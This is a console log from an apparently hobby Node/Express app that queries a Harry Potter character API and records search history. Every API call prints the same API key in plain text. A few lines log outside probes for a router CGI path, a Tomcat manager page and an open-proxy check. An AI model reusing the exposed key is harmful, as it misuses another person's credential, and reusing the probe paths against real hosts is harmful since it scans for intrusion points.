[ { _id: '5a123c260f5ae10021650db9',
    name: 'Dobby',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: false,
    dumbledoresArmy: false,
    deathEater: false,
    bloodStatus: 'unknown',
    species: 'house-elf' } ]
[0mGET /character/Dobby [32m200 [0m185.014 ms - 198[0m
in getHistory POST route
{ characterName: 'Dobby' }
{ _id: 5becbe99e3d32b7d767756e5, characterName: 'Dobby' }
{ _id: 5becbe99e3d32b7d767756e5, characterName: 'Dobby', __v: 0 }
[0mPOST /getHistory [32m200 [0m2.662 ms - 2[0m
[0mGET /harryStyles.css [36m304 [0m0.308 ms - -[0m
https://www.potterapi.com/v1/characters?name=Dobby&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a123c260f5ae10021650db9',
    name: 'Dobby',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: false,
    dumbledoresArmy: false,
    deathEater: false,
    bloodStatus: 'unknown',
    species: 'house-elf' } ]
[0mGET /character/Dobby [32m200 [0m168.484 ms - 198[0m
in getHistory POST route
{ characterName: 'Dobby' }
{ _id: 5becbed6e3d32b7d767756e6, characterName: 'Dobby' }
{ _id: 5becbed6e3d32b7d767756e6, characterName: 'Dobby', __v: 0 }
[0mPOST /getHistory [32m200 [0m2.021 ms - 2[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m0.472 ms - 2[0m
collection removed
[0mGET /? [32m200 [0m0.695 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.484 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.567 ms - 3853[0m
[0mGET /getHistory [32m200 [0m1.277 ms - 2[0m
[0mGET / [32m200 [0m0.566 ms - 1455[0m
[0mGET / [32m200 [0m0.593 ms - 1455[0m
[0mGET / [32m200 [0m0.635 ms - 1455[0m
[0mGET / [32m200 [0m0.602 ms - 1455[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mGET / [32m200 [0m0.650 ms - 1455[0m
[0mGET / [32m200 [0m0.591 ms - 1455[0m
[0mGET / [32m200 [0m0.613 ms - 1455[0m
[0mGET / [32m200 [0m3.852 ms - 1455[0m
[0mGET http://5.188.210.12/echo.php [33m404 [0m1.039 ms - 1642[0m
[0mGET / [32m200 [0m0.665 ms - 1455[0m
[0mGET / [32m200 [0m0.628 ms - 1455[0m
[0mGET / [32m200 [0m0.622 ms - 1455[0m
[0mGET / [32m200 [0m0.641 ms - 1455[0m
[0mGET / [32m200 [0m0.579 ms - 1455[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mGET / [32m200 [0m0.611 ms - 1455[0m
[0mGET / [32m200 [0m0.620 ms - 1455[0m
[0mGET / [32m200 [0m0.651 ms - 1455[0m
[0mGET / [32m200 [0m2.448 ms - 1455[0m
[0mGET / [32m200 [0m0.568 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.480 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.473 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.861 ms - 1642[0m
[0mGET /character/ [33m404 [0m0.837 ms - 1642[0m
https://www.potterapi.com/v1/characters?name=A&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/A [32m200 [0m142.461 ms - 2[0m
in getHistory POST route
{ characterName: 'a' }
{ _id: 5bed2419e3d32b7d767756e7, characterName: 'a' }
{ _id: 5bed2419e3d32b7d767756e7, characterName: 'a', __v: 0 }
[0mPOST /getHistory [32m200 [0m4.320 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Harry&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Harry [32m200 [0m74.136 ms - 2[0m
in getHistory POST route
{ characterName: 'Harry' }
{ _id: 5bed241ee3d32b7d767756e8, characterName: 'Harry' }
{ _id: 5bed241ee3d32b7d767756e8, characterName: 'Harry', __v: 0 }
[0mPOST /getHistory [32m200 [0m2.521 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a12292a0f5ae10021650d7e',
    name: 'Harry Potter',
    role: 'student',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    alias: 'The Boy Who Lived',
    wand: 'Holly, 11", phoenix feather',
    boggart: 'dementor',
    patronus: 'stag',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: true,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Harry%20Potter [32m200 [0m134.739 ms - 399[0m
in getHistory POST route
{ characterName: 'harry potter' }
{ _id: 5bed2424e3d32b7d767756e9, characterName: 'harry potter' }
{ _id: 5bed2424e3d32b7d767756e9,
  characterName: 'harry potter',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.222 ms - 2[0m
[0mGET /getHistory [32m200 [0m2.692 ms - 205[0m
[0mGET / [32m200 [0m0.657 ms - 1455[0m
[0mGET /harryJS.js [32m200 [0m0.482 ms - 3853[0m
[0mGET /harryStyles.css [32m200 [0m0.303 ms - 467[0m
[0mGET /favicon.ico [33m404 [0m2.322 ms - 1642[0m
[0mGET / [32m200 [0m0.606 ms - 1455[0m
[0mPOST /tmUnblock.cgi [0m- [0m- ms - -[0m
[0mGET / [32m200 [0m0.660 ms - 1455[0m
[0mGET / [32m200 [0m0.648 ms - 1455[0m
[0mGET / [32m200 [0m1.484 ms - 1455[0m
[0mGET / [32m200 [0m0.835 ms - 1455[0m
[0mGET / [32m200 [0m0.590 ms - 1455[0m
[0mGET / [32m200 [0m0.656 ms - 1455[0m
[0mGET / [32m200 [0m0.625 ms - 1455[0m
[0mGET / [32m200 [0m0.555 ms - 1455[0m
[0mGET / [32m200 [0m0.574 ms - 1455[0m
[0mGET / [32m200 [0m4.401 ms - 1455[0m
[0mGET / [32m200 [0m2.724 ms - 1455[0m
[0mGET / [32m200 [0m0.581 ms - 1455[0m
[0mGET / [32m200 [0m0.602 ms - 1455[0m
[0mGET / [36m304 [0m0.445 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.308 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.261 ms - -[0m
[0mGET /favicon.ico [33m404 [0m1.742 ms - 1642[0m
[0mGET / [36m304 [0m0.441 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.301 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.305 ms - -[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET / [36m304 [0m0.404 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.295 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.272 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.928 ms - 1642[0m
[0mGET / [32m200 [0m0.600 ms - 1455[0m
[0mGET / [32m200 [0m0.568 ms - 1455[0m
[0mGET / [32m200 [0m0.602 ms - 1455[0m
[0mGET / [36m304 [0m0.432 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.293 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.285 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.844 ms - 1642[0m
https://www.potterapi.com/v1/characters?name=Snape&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Snape [32m200 [0m145.843 ms - 2[0m
in getHistory POST route
{ characterName: 'Snape' }
{ _id: 5bedbbdce3d32b7d767756ea, characterName: 'Snape' }
{ _id: 5bedbbdce3d32b7d767756ea, characterName: 'Snape', __v: 0 }
[0mPOST /getHistory [32m200 [0m2.227 ms - 2[0m
[0mGET /getHistory [32m200 [0m9.376 ms - 272[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m0.740 ms - 2[0m
collection removed
[0mGET /? [36m304 [0m0.443 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.301 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.694 ms - -[0m
https://www.potterapi.com/v1/characters?name=Sdf&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Sdf [32m200 [0m151.774 ms - 2[0m
in getHistory POST route
{ characterName: 'sdf' }
{ _id: 5bedbbe1e3d32b7d767756eb, characterName: 'sdf' }
{ _id: 5bedbbe1e3d32b7d767756eb, characterName: 'sdf', __v: 0 }
[0mPOST /getHistory [32m200 [0m5.222 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Sdfsdf&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Sdfsdf [32m200 [0m104.752 ms - 2[0m
in getHistory POST route
{ characterName: 'sdfsdfs' }
{ _id: 5bedbbe2e3d32b7d767756ec, characterName: 'sdfsdfs' }
{ _id: 5bedbbe2e3d32b7d767756ec,
  characterName: 'sdfsdfs',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.459 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Sdfsdfsdf&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Sdfsdfsdf [32m200 [0m89.464 ms - 2[0m
in getHistory POST route
{ characterName: 'sdfsdfsdfs' }
{ _id: 5bedbbe3e3d32b7d767756ed, characterName: 'sdfsdfsdfs' }
{ _id: 5bedbbe3e3d32b7d767756ed,
  characterName: 'sdfsdfsdfs',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m5.967 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Sdfsdfsdfsdf&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Sdfsdfsdfsdf [32m200 [0m75.754 ms - 2[0m
in getHistory POST route
{ characterName: 'sdfsdfsdfsdfsd' }
{ _id: 5bedbbe3e3d32b7d767756ee,
  characterName: 'sdfsdfsdfsdfsd' }
{ _id: 5bedbbe3e3d32b7d767756ee,
  characterName: 'sdfsdfsdfsdfsd',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m1.974 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Sdfsdfsdfsdfsdf&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Sdfsdfsdfsdfsdf [32m200 [0m76.751 ms - 2[0m
in getHistory POST route
{ characterName: 'sdfsdfsdfsdfsdfsd' }
{ _id: 5bedbbe3e3d32b7d767756ef,
  characterName: 'sdfsdfsdfsdfsdfsd' }
{ _id: 5bedbbe3e3d32b7d767756ef,
  characterName: 'sdfsdfsdfsdfsdfsd',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m1.976 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Sdfsdfsdfsdfsdfsdf&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
https://www.potterapi.com/v1/characters?name=Sdfsdfsdfsdfsdfsdfsdf&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Sdfsdfsdfsdfsdfsdfsdf [32m200 [0m77.569 ms - 2[0m
[]
[0mGET /character/Sdfsdfsdfsdfsdfsdf [32m200 [0m350.980 ms - 2[0m
in getHistory POST route
{ characterName: 'sdfsdfsdfsdfsdfsdfsdfsd' }
{ _id: 5bedbbe4e3d32b7d767756f0,
  characterName: 'sdfsdfsdfsdfsdfsdfsdfsd' }
{ _id: 5bedbbe4e3d32b7d767756f0,
  characterName: 'sdfsdfsdfsdfsdfsdfsdfsd',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m1.961 ms - 2[0m
in getHistory POST route
{ characterName: 'sdfsdfsdfsdfsdfsdfsdfsd' }
{ _id: 5bedbbe4e3d32b7d767756f1,
  characterName: 'sdfsdfsdfsdfsdfsdfsdfsd' }
{ _id: 5bedbbe4e3d32b7d767756f1,
  characterName: 'sdfsdfsdfsdfsdfsdfsdfsd',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.232 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Sdfsdfsdfsdfsdfsdfsdfsd&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Sdfsdfsdfsdfsdfsdfsdfsd [32m200 [0m99.688 ms - 2[0m
in getHistory POST route
{ characterName: 'sdfsdfsdfsdfsdfsdfsdfsdf' }
{ _id: 5bedbbe4e3d32b7d767756f2,
  characterName: 'sdfsdfsdfsdfsdfsdfsdfsdf' }
{ _id: 5bedbbe4e3d32b7d767756f2,
  characterName: 'sdfsdfsdfsdfsdfsdfsdfsdf',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m1.944 ms - 2[0m
[0mGET /getHistory [32m200 [0m2.227 ms - 618[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m1.187 ms - 2[0m
collection removed
[0mGET /? [36m304 [0m0.370 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.309 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.204 ms - -[0m
[0mGET /? [32m200 [0m1.906 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.770 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.616 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m8.059 ms - 1642[0m
[0mGET /? [32m200 [0m0.882 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.541 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.344 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m1.046 ms - 1642[0m
[0mGET /? [32m200 [0m0.640 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.583 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.326 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.990 ms - 1642[0m
[0mGET /? [32m200 [0m0.681 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.509 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.431 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.986 ms - 1642[0m
[0mGET /? [32m200 [0m1.527 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.732 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.419 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m1.657 ms - 1642[0m
[0mGET /? [32m200 [0m0.777 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.511 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.331 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.913 ms - 1642[0m
[0mGET /? [32m200 [0m0.643 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.467 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.311 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.934 ms - 1642[0m
[0mGET /? [32m200 [0m0.660 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.478 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m1.651 ms - 3853[0m
[0mGET /? [32m200 [0m1.510 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.501 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.349 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.856 ms - 1642[0m
https://www.potterapi.com/v1/characters?name=Snape&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Snape [36m304 [0m119.773 ms - -[0m
in getHistory POST route
{ characterName: 'snape' }
{ _id: 5bedbc7ae3d32b7d767756f3, characterName: 'snape' }
{ _id: 5bedbc7ae3d32b7d767756f3, characterName: 'snape', __v: 0 }
[0mPOST /getHistory [32m200 [0m5.100 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a12292a0f5ae10021650d7e',
    name: 'Harry Potter',
    role: 'student',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    alias: 'The Boy Who Lived',
    wand: 'Holly, 11", phoenix feather',
    boggart: 'dementor',
    patronus: 'stag',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: true,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Harry%20Potter [36m304 [0m101.762 ms - -[0m
in getHistory POST route
{ characterName: 'Harry Potter' }
{ _id: 5bedbc7ee3d32b7d767756f4, characterName: 'Harry Potter' }
{ _id: 5bedbc7ee3d32b7d767756f4,
  characterName: 'Harry Potter',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.255 ms - 2[0m
[0mGET /getHistory [32m200 [0m4.082 ms - 142[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m0.494 ms - 2[0m
collection removed
[0mGET /? [36m304 [0m0.483 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.443 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.226 ms - -[0m
[0mGET /? [32m200 [0m3.244 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.467 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.372 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.935 ms - 1642[0m
[0mGET /? [32m200 [0m2.579 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.457 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.343 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.901 ms - 1642[0m
[0mGET /? [32m200 [0m1.845 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.462 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.381 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.873 ms - 1642[0m
[0mGET /? [32m200 [0m0.614 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.481 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.494 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m1.192 ms - 1642[0m
[0mGET / [36m304 [0m0.462 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.318 ms - -[0m
[0mGET / [32m200 [0m0.630 ms - 1455[0m
[0mGET / [32m200 [0m1.576 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.514 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.423 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.887 ms - 1642[0m
https://www.potterapi.com/v1/characters?name=Harry&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Harry [32m200 [0m159.663 ms - 2[0m
in getHistory POST route
{ characterName: 'Harry' }
{ _id: 5bedc92be3d32b7d767756f5, characterName: 'Harry' }
{ _id: 5bedc92be3d32b7d767756f5, characterName: 'Harry', __v: 0 }
[0mPOST /getHistory [32m200 [0m2.238 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a12292a0f5ae10021650d7e',
    name: 'Harry Potter',
    role: 'student',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    alias: 'The Boy Who Lived',
    wand: 'Holly, 11", phoenix feather',
    boggart: 'dementor',
    patronus: 'stag',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: true,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Harry%20Potter [32m200 [0m83.056 ms - 399[0m
in getHistory POST route
{ characterName: 'Harry Potter' }
{ _id: 5bedc930e3d32b7d767756f6, characterName: 'Harry Potter' }
{ _id: 5bedc930e3d32b7d767756f6,
  characterName: 'Harry Potter',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.594 ms - 2[0m
[0mGET /getHistory [32m200 [0m1.756 ms - 142[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m0.445 ms - 2[0m
collection removed
[0mGET /? [32m200 [0m0.503 ms - 1455[0m
[0mGET /harryStyles.css [36m304 [0m0.320 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.286 ms - -[0m
[0mGET / [32m200 [0m0.684 ms - 1455[0m
[0mGET / [32m200 [0m0.608 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.492 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.485 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.900 ms - 1642[0m
[0mGET /getHistory [32m200 [0m1.382 ms - 2[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m0.361 ms - 2[0m
collection removed
[0mGET /? [32m200 [0m3.852 ms - 1455[0m
[0mGET /harryStyles.css [36m304 [0m0.498 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.481 ms - -[0m
[0mGET /getHistory [36m304 [0m1.351 ms - -[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m0.382 ms - 2[0m
collection removed
[0mGET /? [36m304 [0m0.388 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.472 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.520 ms - -[0m
[0mGET / [32m200 [0m0.610 ms - 1455[0m
[0mGET / [32m200 [0m3.383 ms - 1455[0m
[0mGET / [32m200 [0m1.103 ms - 1455[0m
[0mGET / [32m200 [0m0.566 ms - 1455[0m
[0mGET / [32m200 [0m0.605 ms - 1455[0m
[0mGET / [32m200 [0m0.633 ms - 1455[0m
[0mGET / [32m200 [0m0.616 ms - 1455[0m
[0mGET / [32m200 [0m0.686 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.474 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.448 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.879 ms - 1642[0m
[0mGET / [32m200 [0m0.686 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.457 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.453 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.884 ms - 1642[0m
[0mGET /getHistory [32m200 [0m1.401 ms - 2[0m
[0mGET /character/ [33m404 [0m1.613 ms - 1642[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m0.841 ms - 2[0m
collection removed
[0mGET /? [32m200 [0m0.513 ms - 1455[0m
[0mGET /harryStyles.css [36m304 [0m0.713 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.197 ms - -[0m
[0mGET / [32m200 [0m0.615 ms - 1455[0m
[0mGET / [32m200 [0m0.629 ms - 1455[0m
[0mGET / [32m200 [0m0.606 ms - 1455[0m
[0mGET / [32m200 [0m0.560 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.467 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.457 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.868 ms - 1642[0m
https://www.potterapi.com/v1/characters?name=Harry&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Harry [32m200 [0m292.862 ms - 2[0m
in getHistory POST route
{ characterName: 'harry' }
{ _id: 5bee32e5e3d32b7d767756f7, characterName: 'harry' }
{ _id: 5bee32e5e3d32b7d767756f7, characterName: 'harry', __v: 0 }
[0mPOST /getHistory [32m200 [0m2.187 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a12292a0f5ae10021650d7e',
    name: 'Harry Potter',
    role: 'student',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    alias: 'The Boy Who Lived',
    wand: 'Holly, 11", phoenix feather',
    boggart: 'dementor',
    patronus: 'stag',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: true,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Harry%20Potter [32m200 [0m89.448 ms - 399[0m
in getHistory POST route
{ characterName: 'Harry Potter' }
{ _id: 5bee32eee3d32b7d767756f8, characterName: 'Harry Potter' }
{ _id: 5bee32eee3d32b7d767756f8,
  characterName: 'Harry Potter',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.015 ms - 2[0m
[0mGET /getHistory [32m200 [0m1.728 ms - 142[0m
https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a12292a0f5ae10021650d7e',
    name: 'Harry Potter',
    role: 'student',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    alias: 'The Boy Who Lived',
    wand: 'Holly, 11", phoenix feather',
    boggart: 'dementor',
    patronus: 'stag',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: true,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Harry%20Potter [36m304 [0m84.832 ms - -[0m
in getHistory POST route
{ characterName: 'Harry Potter' }
{ _id: 5bee32f9e3d32b7d767756f9, characterName: 'Harry Potter' }
{ _id: 5bee32f9e3d32b7d767756f9,
  characterName: 'Harry Potter',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m1.838 ms - 2[0m
[0mGET / [32m200 [0m0.599 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.455 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.463 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.852 ms - 1642[0m
[0mGET / [32m200 [0m0.654 ms - 1455[0m
[0mGET / [32m200 [0m0.659 ms - 1455[0m
[0mGET / [32m200 [0m0.610 ms - 1455[0m
[0mGET / [32m200 [0m0.644 ms - 1455[0m
[0mGET / [32m200 [0m1.077 ms - 1455[0m
[0mGET / [32m200 [0m0.609 ms - 1455[0m
[0mGET / [36m304 [0m0.435 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.304 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.239 ms - -[0m
[0mGET /favicon.ico [33m404 [0m1.396 ms - 1642[0m
[0mGET / [32m200 [0m0.621 ms - 1455[0m
[0mGET / [32m200 [0m0.621 ms - 1455[0m
[0mGET / [32m200 [0m0.560 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.534 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.443 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.841 ms - 1642[0m
[0mGET / [32m200 [0m0.629 ms - 1455[0m
[0mGET / [32m200 [0m0.644 ms - 1455[0m
[0mGET / [32m200 [0m0.600 ms - 1455[0m
[0mGET / [32m200 [0m0.742 ms - 1455[0m
[0mGET / [32m200 [0m0.606 ms - 1455[0m
[0mGET / [32m200 [0m0.640 ms - 1455[0m
[0mGET / [32m200 [0m0.876 ms - 1455[0m
[0mGET / [32m200 [0m0.643 ms - 1455[0m
[0mGET / [32m200 [0m0.604 ms - 1455[0m
[0mGET / [32m200 [0m0.637 ms - 1455[0m
[0mGET / [32m200 [0m0.628 ms - 1455[0m
[0mGET / [32m200 [0m3.818 ms - 1455[0m
[0mGET / [32m200 [0m0.597 ms - 1455[0m
[0mGET / [32m200 [0m0.617 ms - 1455[0m
[0mGET / [32m200 [0m0.567 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.870 ms - 1642[0m
[0mGET / [32m200 [0m0.658 ms - 1455[0m
[0mGET / [32m200 [0m0.622 ms - 1455[0m
[0mGET / [32m200 [0m1.934 ms - 1455[0m
[0mGET / [32m200 [0m0.699 ms - 1455[0m
[0mGET / [32m200 [0m3.791 ms - 1455[0m
[0mGET / [32m200 [0m0.605 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.457 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.439 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.854 ms - 1642[0m
[0mGET / [32m200 [0m0.602 ms - 1455[0m
[0mGET / [32m200 [0m0.569 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.557 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.405 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.890 ms - 1642[0m
[0mGET / [32m200 [0m0.597 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.456 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.491 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m2.377 ms - 1642[0m
[0mGET / [32m200 [0m1.016 ms - 1455[0m
[0mGET / [32m200 [0m1.552 ms - 1455[0m
[0mGET / [32m200 [0m0.641 ms - 1455[0m
